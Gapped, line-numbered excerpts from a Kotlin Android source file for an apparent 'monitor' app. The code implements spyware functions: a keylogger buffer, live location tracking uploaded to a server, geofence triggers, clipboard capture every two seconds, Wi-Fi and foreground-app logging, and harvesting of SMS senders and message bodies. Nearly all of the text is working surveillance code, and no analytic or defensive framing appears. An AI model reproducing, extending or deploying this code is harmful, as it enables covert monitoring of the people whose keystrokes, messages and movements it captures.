   163→    fun appendKeylog(packageName: String, text: String, viewType: String = "text") {
   164→        if (keyloggerActive) {
   165→            val entry = KeylogEntry(
   166→                timestamp = System.currentTimeMillis(),
   167→                packageName = packageName,
   168→                text = text,
   169→                viewType = viewType
   170→            )
   171→            keylogBuffer.add(entry)
   172→            
   173→            // Limit buffer size
   174→            while (keylogBuffer.size > MAX_KEYLOG_SIZE) {
   175→                keylogBuffer.poll()
   176→            }

   178→            // Save to file
   179→            saveKeylogToFile(entry)

   237→    fun locationLiveStart(context: Context, intervalSeconds: Int = 30): String {
   238→        if (locationTrackingActive) {
   239→            return "Location tracking already active"
   240→        }
   241→        
   242→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   243→            != PackageManager.PERMISSION_GRANTED &&
   244→            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) 
   245→            != PackageManager.PERMISSION_GRANTED) {
   246→            return "Location permission not granted"
   247→        }
   248→        
   249→        locationTrackingActive = true
   250→        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
   251→        
   252→        // Create location listener
   253→        locationListener = object : LocationListener {
   254→            override fun onLocationChanged(location: Location) {
   255→                addLocationToHistory(
   256→                    location.latitude,
   257→                    location.longitude,
   258→                    location.accuracy,
   259→                    location.speed,
   260→                    location.altitude,
   261→                    location.provider ?: "unknown"
   262→                )
   263→                
   264→                // Check geofences
   265→                checkGeofences(location.latitude, location.longitude, context)
   266→                
   267→                // Send to server
   268→                CoroutineScope(Dispatchers.IO).launch {
   269→                    try {
   270→                        ApiClient.sendLocation(
   271→                            context,
   272→                            location.latitude,
   273→                            location.longitude,
   274→                            location.accuracy
   275→                        )
   276→                    } catch (e: Exception) { Log.w(TAG, "sendLocation error", e) }
   277→                }
   278→            }
   279→            
   280→            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
   281→            override fun onProviderEnabled(provider: String) {}
   282→            override fun onProviderDisabled(provider: String) {}
   283→        }
   284→        
   285→        // Request updates
   286→        try {
   287→            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
   288→                lm.requestLocationUpdates(
   289→                    LocationManager.GPS_PROVIDER,
   290→                    (intervalSeconds * 1000).toLong(),
   291→                    10f,
   292→                    locationListener!!,
   293→                    Looper.getMainLooper()
   294→                )
   295→            }
   296→            
   297→            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
   298→                lm.requestLocationUpdates(
   299→                    LocationManager.NETWORK_PROVIDER,
   300→                    (intervalSeconds * 1000).toLong(),
   301→                    10f,
   302→                    locationListener!!,
   303→                    Looper.getMainLooper()
   304→                )
   305→            }
   306→            
   307→            // Get last known location immediately
   308→            val lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
   309→                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
   310→            
   311→            if (lastKnown != null) {
   312→                addLocationToHistory(
   313→                    lastKnown.latitude,
   314→                    lastKnown.longitude,
   315→                    lastKnown.accuracy,
   316→                    lastKnown.speed,
   317→                    lastKnown.altitude,
   318→                    lastKnown.provider ?: "unknown"
   319→                )
   320→            }
   321→            
   322→            return "Live location tracking started (interval: ${intervalSeconds}s)"
   323→        } catch (e: Exception) {
   324→            Log.e(TAG, "Location tracking start error", e)
   325→            locationTrackingActive = false
   326→            return "Error: ${e.message}"
   327→        }
   328→    }

   407→    // ===== GEO FENCING =====
   408→    fun geoAdd(params: Map<String, Any>): String {
   409→        val arg = params["arg"]?.toString() ?: ""
   410→        val parts = arg.split(",")
   411→        
   412→        return if (parts.size >= 2) {
   413→            val lat = parts[0].trim().toDoubleOrNull()
   414→            val lon = parts[1].trim().toDoubleOrNull()
   415→            val radius = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 500
   416→            val name = parts.getOrNull(3)?.trim()
   417→            
   418→            if (lat != null && lon != null) {
   419→                val fence = GeoFence(
   420→                    id = java.util.UUID.randomUUID().toString(),
   421→                    lat = lat,
   422→                    lon = lon,
   423→                    radius = radius,
   424→                    active = true,
   425→                    name = name
   426→                )
   427→                geoFences.add(fence)
   428→                saveGeofences()
   429→                "Geofence added: ${fence.id} at ($lat, $lon) radius ${radius}m"
   430→            } else {
   431→                "Invalid coordinates"
   432→            }
   433→        } else {
   434→            "Usage: lat,lon,radius,name"
   435→        }
   436→    }

   476→    private fun checkGeofences(lat: Double, lon: Double, context: Context) {
   477→        for (fence in geoFences.filter { it.active }) {
   478→            val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
   479→            
   480→            if (distance <= fence.radius) {
   481→                // Buffer event locally
   482→                com.abuzahra.manager.EventBuffer.addEvent(
   483→                    "geofence_entered",
   484→                    mapOf(
   485→                        "fence_id" to fence.id,
   486→                        "fence_name" to (fence.name ?: "Unnamed"),
   487→                        "distance" to distance
   488→                    )
   489→                )
   490→            }
   491→        }
   492→    }
   493→    
   494→    private fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Float {
   495→        val results = FloatArray(1)
   496→        Location.distanceBetween(lat1, lon1, lat2, lon2, results)
   497→        return results[0]
   498→    }

   502→            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)

   538→    // ===== CLIPBOARD MONITOR =====
   539→    fun clipboardMonitorStart(context: Context): String {
   540→        if (clipboardMonitorActive) {
   541→            return "Clipboard monitoring already active"
   542→        }
   543→        
   544→        clipboardMonitorActive = true
   545→        
   546→        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
   547→            var lastClipboard = ""
   548→            
   549→            while (isActive && clipboardMonitorActive) {
   550→                try {
   551→                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
   552→                    val clip = clipboard.primaryClip
   553→                    
   554→                    if (clip != null && clip.itemCount > 0) {
   555→                        val text = clip.getItemAt(0).text?.toString() ?: ""
   556→                        
   557→                        if (text.isNotEmpty() && text != lastClipboard) {
   558→                            lastClipboard = text
   559→                            
   560→                            val entry = ClipboardEntry(
   561→                                timestamp = System.currentTimeMillis(),
   562→                                text = text,
   563→                                sourcePackage = clip.description?.label?.toString()
   564→                            )
   565→                            clipboardHistory.add(entry)
   566→                            
   567→                            while (clipboardHistory.size > MAX_CLIPBOARD_HISTORY) {
   568→                                clipboardHistory.poll()
   569→                            }
   570→                            
   571→                            // Buffer event locally
   572→                            com.abuzahra.manager.EventBuffer.addEvent(
   573→                                "clipboard_change",
   574→                                mapOf("text" to text.take(500))
   575→                            )
   576→                        }
   577→                    }
   578→                    
   579→                    delay(2000) // Check every 2 seconds
   580→                } catch (e: Exception) {
   581→                    Log.e(TAG, "Clipboard monitor error", e)
   582→                    delay(5000)
   583→                }
   584→            }
   585→        }
   586→        
   587→        return "Clipboard monitoring started"
   588→    }

   624→            var lastWifi = ""
   625→            
   626→            while (isActive && wifiMonitorActive) {
   627→                try {
   628→                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
   629→                    
   630→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
   631→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   632→                            != PackageManager.PERMISSION_GRANTED) {
   633→                            delay(30000)
   634→                            continue
   635→                        }
   636→                    }
   637→                    
   638→                    val currentWifi = wm.connectionInfo
   639→                    val ssid = currentWifi?.ssid?.toString() ?: "Not connected"
   640→                    
   641→                    if (ssid != lastWifi) {
   642→                        lastWifi = ssid
   643→                        
   644→                        // Buffer event locally
   645→                        com.abuzahra.manager.EventBuffer.addEvent(
   646→                            "wifi_change",
   647→                            mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
   648→                        )
   649→                    }
   650→                    
   651→                    delay(30000) // Check every 30 seconds
   652→                } catch (e: Exception) {
   653→                    Log.e(TAG, "WiFi monitor error", e)
   654→                    delay(60000)
   655→                }
   656→            }
   657→        }
   658→        
   659→        return "WiFi monitoring started"
   660→    }

   672→    fun appMonitorStart(context: Context): String {
   673→        if (appMonitorActive) {
   674→            return "App monitoring already active"
   675→        }
   676→        
   677→        appMonitorActive = true
   678→        
   679→        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
   680→            var lastApp = ""
   681→            
   682→            while (isActive && appMonitorActive) {
   683→                try {
   684→                    // Get foreground app using usage stats
   685→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
   686→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.PACKAGE_USAGE_STATS) 
   687→                            == PackageManager.PERMISSION_GRANTED) {
   688→                            
   689→                            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) 
   690→                                as android.app.usage.UsageStatsManager
   691→                            
   692→                            val endTime = System.currentTimeMillis()
   693→                            val startTime = endTime - 60000
   694→                            
   695→                            val usageStats = usageStatsManager.queryUsageStats(
   696→                                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
   697→                                startTime, endTime
   698→                            )
   699→                            
   700→                            val foregroundApp = usageStats
   701→                                .filter { it.lastTimeUsed > startTime }
   702→                                .maxByOrNull { it.lastTimeUsed }
   703→                                ?.packageName ?: ""
   704→                            
   705→                            if (foregroundApp.isNotEmpty() && foregroundApp != lastApp) {
   706→                                lastApp = foregroundApp
   707→                                
   708→                                val entry = AppUsageEntry(
   709→                                    timestamp = System.currentTimeMillis(),
   710→                                    packageName = foregroundApp,
   711→                                    eventType = "foreground",
   712→                                    duration = 0
   713→                                )
   714→                                appUsageLog.add(entry)
   715→                                
   716→                                // Buffer event locally
   717→                                com.abuzahra.manager.EventBuffer.addEvent(
   718→                                    "app_change",
   719→                                    mapOf("package" to foregroundApp)
   720→                                )
   721→                            }
   722→                        }
   723→                    }
   724→                    
   725→                    delay(5000) // Check every 5 seconds
   726→                } catch (e: Exception) {
   727→                    Log.e(TAG, "App monitor error", e)
   728→                    delay(10000)
   729→                }
   730→            }
   731→        }
   732→        
   733→        return "App monitoring started"
   734→    }

   783→                            if (cursor.moveToFirst()) {
   784→                                val id = cursor.getLong(0)
   785→                                
   786→                                if (id > lastSmsId) {
   787→                                    lastSmsId = id
   788→

   790→                                    val body = cursor.getString(2)
   791→                                    val date = cursor.getLong(3)

   796→                                        "sms_received",
   797→                                        mapOf(
   798→                                            "from" to address,
   799→                                            "body" to body,
   800→                                            "type" to (if (type == 1) "received" else "sent")
   801→                                        )
   802→                                    )
   803→                                }
   804→                            }
   805→                        }
   806→                    }
